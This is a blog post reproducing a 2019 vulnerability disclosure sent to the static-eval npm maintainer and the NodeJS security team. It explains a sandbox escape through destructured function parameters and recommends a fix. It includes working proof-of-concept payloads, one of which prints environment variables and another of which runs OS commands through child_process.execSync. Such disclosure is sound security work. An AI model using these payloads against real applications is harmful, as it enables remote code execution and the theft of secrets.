<!--
.. title: static-eval sandbox escape original writeup
.. status: private
.. slug: static-eval-sandbox-escape-original-writeup
.. date: 2019-02-17 02:53:30 UTC-03:00
.. tags: 
.. category: 
.. link: 
.. description: 
.. type: text
-->

This is the original writeup I sent to the static-eval mantainer and to the
NodeJS security team before they published [an official
advisory](https://www.npmjs.com/advisories/758):

<pre>

Hi! I found a vulnerability in the static-eval npm library to escape the
sandbox offered by it.

The static-eval module is intended to statically evaluate a code block. In
theory (and assumed by many modules who depend on it) should have no side
effects, should not have have access to the standard library, and effectively
be sandboxed. However if un-sanitized user input is passed to evaluate we can
break out of this “sandbox”.

To find the sandbox escape I was inspired by the previous work done by Matt
Austin[1]. Unlike Matt's technique, mine requires that a variable is defined
and that its value is anything other than a function.

This is the final expression I used to escape the sandbox (I use x as the
variable that is not a function):

    (function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()

To verify that the vulnerability exists, you can run `npm install static-eval` and
write the following to an eval.js file:

    var evaluate = require('static-eval');
    var parse = require('esprima').parse;

    var src = process.argv[2];
    var ast = parse(src).body[0].expression;

    console.log(evaluate(ast, {x:1}));

(this a modified version of the example on the readme[2]. The only change I did
was to define the x variable so my exploit works)

Then, run the following:

    node eval.js '(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'

To log the environment variables of the system, confirming the presence of the
vulnerability. You can also execute more dangerous payloads, such as this one
that will execute the `id` command on the system and print its output:

    node eval.js '(function({x}){return x.constructor})({x:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()'

It can also be replaced by any other OS command.


Exploit explaination
--------------------

Blocking access to function attributes in version 2.0 was surprisingly a good
way of preventing the majority of the JS sandbox bypass techniques so I had to
be more creative to achieve it. Matt already pointed out[3] that the dynamic
Function call should be refactored so I targeted that.

I noted that when you define an inline function, its body is analyzed to check
you don't access attributes of functions. This check is done when the function
is defined and not when it is called. This sounded strange to me so I started
looking at it.

To decide the type of the variables at definition time, it uses the initial
variables passed to the evaluate function. Then, to ensure its value is not
overwritten in function parameters, it sets the value of variables named as a
function parameter to null:

    node.params.forEach(function(key) {
        if(key.type == 'Identifier'){
          vars[key.name] = null;
        }
    });

Unfortunately, this doesn't work as expected if I use object destructuring[4]
in the function parameters. In this case, the value of `key.type` will be
`ObjectPattern` so the variable won't be set to null. Then, the system will
confuse between the initial value of the variable and the actual one that
depends on the function call. For example, if I eval this when x has an initial
value of 1:

    (function({x}){return x.constructor})({x:"".sub})

when the function is defined, the system will think that I'm accessing the
constructor of 1 (the initial value of x). This is allowed so the function will
be created. But actually, when the function is executed the value of x will
depend on the function parameters. In this case it will be "".sub that is a
function, so the whole expression will return the function constructor, that
I'm not supposed to access.


Recommended fix
--------------

The easiest thing to do to fix this exploitation technique would be to forbid
function definitions that use parameter destructuring:

    node.params.forEach(function(key) {
        if(key.type == 'Identifier'){
          vars[key.name] = null;
        }
        else return FAIL;
    });

However, I believe there might be other similar techniques to escape the
sandbox again, so the long-term fix would be, as Matt said before, to refactor
out the dynamic Function call completely.


References
----------

[1] https://maustin.net/articles/2017-10/static_eval
[2] https://github.com/substack/static-eval#example
[3] https://github.com/substack/static-eval/pull/18
[4] https://simonsmith.io/destructuring-objects-as-function-parameters-in-es6/

</pre>
